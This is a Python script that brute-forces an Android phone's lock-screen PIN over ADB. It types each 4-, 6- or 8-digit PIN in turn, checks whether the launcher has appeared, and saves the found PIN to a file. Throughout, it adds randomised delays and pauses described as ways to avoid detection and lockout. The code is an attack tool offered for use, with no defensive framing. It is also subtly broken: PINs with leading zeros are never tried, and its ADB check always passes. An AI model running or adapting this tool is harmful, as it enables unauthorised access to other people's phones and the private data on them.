import os
import time
import random
import argparse
import platform
from colorama import Fore, Back, Style, init

# Initialize colorama for Windows & Termux
init(autoreset=True)

# Function to clear the screen
def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

# Function to display ASCII art first
def display_ascii():
    ascii_art = r"""                 
             *                  
            ***                 
             *                  
  ******                        
 ********  ***     ***  ****    
*      **   ***     **** **** * 
       *     **      **   ****  
      *      **      **    **   
     ***     **      **    **   
      ***    **      **    **   
       ***   **      **    **   
        **   **      **    **   
        **   *** *   ***   ***  
        *     ***     ***   *** 
       *                        
      *                         
     *                          
    """
    print(f"{Fore.CYAN}{Back.BLACK}{Style.BRIGHT}{ascii_art}\n")

# Show ASCII before anything else
clear_screen()
display_ascii()

# Function to check if running on Termux
def is_termux():
    return os.path.exists('/data/data/com.termux/')

# Function to check if ADB is installed
def check_adb():
    try:
        os.system("adb version > nul 2>&1" if platform.system() == "Windows" else "adb version > /dev/null 2>&1")
        return True
    except:
        return False

# Function to send PIN input via ADB
def send_pin(pin):
    command = f"adb shell input text {pin}"
    os.system(command)
    os.system("adb shell input keyevent 66")  # Press Enter
    time.sleep(random.uniform(1.2, 3.0))  # Randomized delay to avoid detection

# Function to brute force the PIN
def brute_force(pin_length):
    start = 10**(pin_length - 1)  # Smallest number for given length
    end = 10**pin_length  # Largest number +1 for given length
    
    for pin in range(start, end):
        pin_str = str(pin).zfill(pin_length)
        print(f"Trying PIN: {pin_str}")
        send_pin(pin_str)
        
        # Check if the phone is unlocked
        unlock_check = os.popen("adb shell dumpsys window | grep mCurrentFocus").read()
        if "HomeActivity" in unlock_check or "Launcher" in unlock_check:
            print(f"{Fore.GREEN}[+] PIN Found: {pin_str}{Style.RESET_ALL}")
            with open("found_password.txt", "w") as f:
                f.write(f"Correct PIN: {pin_str}\n")
            return pin_str
        
        # Introduce a longer wait every 10 attempts to prevent lockout
        if pin % 10 == 0:
            wait_time = random.uniform(5, 10)
            print(f"{Fore.YELLOW}[!] Taking a break for {wait_time:.2f} seconds to avoid detection...{Style.RESET_ALL}")
            time.sleep(wait_time)

    print(f"{Fore.RED}[-] PIN not found in range.{Style.RESET_ALL}")
    return None

# Ensure ASCII is always displayed first, even if ADB is missing
if is_termux():
    os.system("pkg install android-tools -y")  # Ensure ADB is installed in Termux
elif not check_adb():
    print(f"{Fore.RED}[!] ADB is not installed or not in PATH. Please install ADB and try again.{Style.RESET_ALL}")
    exit()

# Argument parser for choosing PIN length
parser = argparse.ArgumentParser(description="Android PIN Brute Force using ADB")
parser.add_argument("-l", "--length", type=int, choices=[4, 6, 8], required=True, help="Choose PIN length: 4, 6, or 8 digits")
args = parser.parse_args()

brute_force(args.length)
